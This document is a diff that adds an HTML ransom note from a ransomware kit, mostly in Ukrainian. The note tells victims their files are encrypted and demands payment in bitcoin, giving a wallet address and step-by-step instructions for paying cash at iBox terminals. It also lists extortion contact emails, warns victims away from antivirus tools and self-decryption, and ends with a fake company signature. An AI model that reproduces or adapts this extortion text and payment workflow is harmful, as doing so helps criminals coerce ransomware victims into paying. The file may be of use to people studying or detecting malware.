@@ -1,0 +1,236 @@
+﻿<html>
+    <style type="text/css">
+
+      body {
+  background-color: #404040;
+      }
+{
+    margin: 0;
+    padding: 0;
+}
+
+h1, h3{
+  text-align:  center;
+  text-transform: uppercase;
+  font-weight: normal;
+}
+
+
+/*---*/
+.tabs1{
+    width: 800px;
+    display: block;
+    margin: auto;
+    position: relative;
+}
+.tabs1 .head{
+    text-align:  center;
+    float: top;
+    text-transform: uppercase;
+    font-weight: normal;
+    display: block;
+    padding: 15px;
+    color: #000000;
+    background: #4A83FD;
+}
+
+.tabs1 .identi {
+    text-align:  center;
+    float: top;
+    display: block;
+    padding: 15px;
+    background: #303030;
+    color: #DFDFDF;
+}
+
+/*---*/
+.tabs{
+    width: 800px;
+    display: block;
+    margin: auto;
+    position: relative;
+}
+
+.tabs .tab{
+    float: left;
+    display: block;
+}
+
+.tabs .tab>input[type="radio"] {
+    position: absolute;
+    top: -9999px;
+    left: -9999px;
+}
+
+.tabs .tab>label {
+    display: block;
+    padding: 6px 21px;
+    font-size: 18x;
+    text-transform: uppercase;
+    cursor: pointer;
+    position: relative;
+    color: #FFF;
+    background: #4A83FD;
+}
+
+.tabs .content {
+    z-index: 0;/* or display: none; */
+    overflow: hidden;
+    width: 800px;
+    /*padding: 25px;*/
+    position: absolute;
+    top: 32px;
+    left: 0;
+    background: #303030;
+    color: #DFDFDF;
+    
+    opacity:0;
+    transition: opacity 400ms ease-out;
+}
+
+.tabs .content .text{
+width: 700px; 
+padding: 25px;
+}
+
+.tabs>.tab>[id^="tab"]:checked + label {
+    top: 0;
+    background: #303030;
+    color: #F5F5F5;
+}
+
+.tabs>.tab>[id^="tab"]:checked ~ [id^="tab-content"] {
+    z-index: 1;/* or display: block; */
+   
+    opacity: 1;
+    transition: opacity 400ms ease-out;
+}
+
+    </style>
+  <head>
+    <meta charset="utf-8">
+    <title>Ваші файли тимчасово зашифрувати! Не хвилюйтесь!</title>
+  </head>
+
+  <body>
+
+    <div class="tabs1">
+      <div class="head" ><h3>Ваш личный идентификатор</h3></div>
+      <div class="identi">
+      <div> ID ID 
+</div><!-- !!! dont changing this !!! -->
+      </div>
+    </div>
+  <!-- -->
+    <div class="tabs">
+<!--tab-->  
+    <div class="tab">
+        <input type="radio" name="tabs" checked="checked" id="tab1" />
+        
+        <div id="tab-content1" class="content">
+          <h1> Ваші Файли Тимчасово Недоступні.</h1>
+          <hr/>
+          <h3>Всі ваші дані були зашіврованни!</h3>
+          <br/>          
+          <div class="text">
+          <!--text data -->
+              To recover data you need decryptor.</br>
+              To get the decryptor you should:</br>
+              pay for decrypt:</br>
+              site for buy bitcoin:</br>
+              <strong>Buy 1 BTC on one of these sites</strong></br>
+            <ol>
+              <li><strong>https://localbitcoins.com</strong></li>
+              <li><strong>https://www.coinbase.com</strong></li>
+              <li><strong>https://xchange.cc</strong></li>
+            </ol></br>
+            
+            </ul>
+          <!--text data -->
+          </div> 
+        </div>
+    </div>
+ <!--tab-->    
+    <div class="tab">
+        <input type="radio" name="tabs" checked="checked" id="tab2" />
+        
+        <div id="tab-content2" class="content">
+          <h1> Ваші Файли Тимчасово Недоступні.</h1>
+          <hr/>
+          <h3>Ваші дані були зашіврованни!</h3>
+          <br/>          
+          <div class="text">
+          <!--text data -->
+              Для відновлення даних потрібно дешифратор.</br>
+Щоб отримати дешифратор, ви повинні, оплатити послуги розшифровки:</br>
+Оплата відбувається за коштами біткойн (BTC):</br>
+Вартість послуги складає <b>3500 гривень</b></br>
+Оплату можна провести в терміналі IBox. або виберіть один з обмінних сайтів на сторінці - https://www.bestchange.ru/privat24-uah-to-bitcoin.html (приклад обмін Приват24 на BTC) також можете скористатися послугами https://e-btc.com.ua</br>
+</br>
+</br>
+Як приклад розглянемо оплату готівкою через термінал:</br>
+<li>1. Знайти найближчий термінал Айбокс <img src="https://btcu.biz/img/faq/ibox_terminal.png" alt="Айбокс" /></br>
+за допомогою рядка пошуку знайти сервіс «Btcu.biz».</li></br>
+</br>
+<li>2. Ввести свій номер телефону.</li>
+</br>
+<li>3. Внести суму 3500 грн</li>
+</br>
+<li>4. Роздрукувати і зберегти чек.</li>
+</br>
+<li>5. Зайти на сайт btcu.biz.</li>
+</br>
+<li>6. У розділі «КУПИТЬ» => «ЗА НАЛИЧНЫЕ В ТЕРМИНАЛЕ» ввести код з чека (підкреслять червоним), ввести капчу, ознайомитися і погодитися з Умовами використання і натиснути кнопку «Оплатити». </br>
+<img src="https://btcu.biz/img/faq/receipt_ibox.png" alt="Чек" /></br>
+Переконатися, що код прийнятий і сума збігається з внесеної в термінал.</li></br>
+</br>
+ <li>7. Після того, як код був коректно прийнятий системою, натисніть «Далі» для вибору способу отримання коштів.</li></br>
+<img src="https://btcu.biz/img/faq/Activ_rus.png" alt="Сайт" /></br>
+</br>
+<li>8. Виберіть розділ «Поповнити ВТС-адреса», введіть адресу: <b>1Gb4Pk85VKYngfDPy3X2tjYfzvU62oLnas</b></br>
+   і капчу, натисніть кнопку «Відправити».</li></br>
+<img src="https://btcu.biz/img/faq/Activ2_rus.png" alt="Сайт2" /></br>
+</br>
+<li>9. Після оплати:</br>
+Надіслати скріншот платежу на systems32x@gmail.com</br>
+У листі вкажіть свій особистий ідентифікатор (подивіться на початок цього документа).</li></br>
+</br>
+<li>10. Після отримання дешифратора і інструкцій, зможете продожам роботу.</li></br>
+            
+			<center>Додаткова інформація:</center></br>
+Програма можемо дешифрувати один файл як доказ того, що у неї є декодер. Для цього необхідно надіслати зашифрований файл, вагою не більше 3 mb, на пошту: systems32x@gmail.com</br>
+</br>
+<h2><center>Увага!</center></h2></br>
+<ul>
+Всі файли розшифровуються тільки після 100% оплати</br>
+Ви дійсно отримуєте дешифратор після оплати</br>
+Не намагайтеся видалити програму або запустити антивірусні інструменти це може ускладнити вам роботу</br>
+Спроби самодешіфрованія файлів приведуть до втрати ваших даних</br>
+Декодери інших користувачів не сумісні з вашими даними, оскільки унікальний ключ шифрування кожного користувача.</br>
+За запитом користувачів, надаємо контакти клієнтів, які вже користувалися послугами нашого сервісу.</br>
+Нашими клієнтами є провідні ІТ компанії України.</br>
+<h3>Обов'язково запишіть резервні контакти для зв'язку:</h3>
+systems32x@gmail.com - основний</br>
+systems32x@yahoo.com - резервний</br>
+Додаткові контакти:</br>
+systems32x@tutanota.com - (якщо відповіді не прийшло після 24-х годин)</br>
+help32xme@usa.com - (якщо відповіді не прийшло після 24-х годин)</br>
+Additional.mail@mail.com - (якщо відповіді не прийшло після 24-х годин)</br>
+</br>
+З повагою Віктор Федорович.</br>
+Unlock files LLC</br>
+33530 1st Way South Ste. 102</br>
+Federal Way, WA 98003</br>
+United States</br>
+</ul>
+          <!--text data -->
+          </div> 
+        </div>
+    </div>
+
+    
+  </div>
+  
+  </body>
+</html>
+
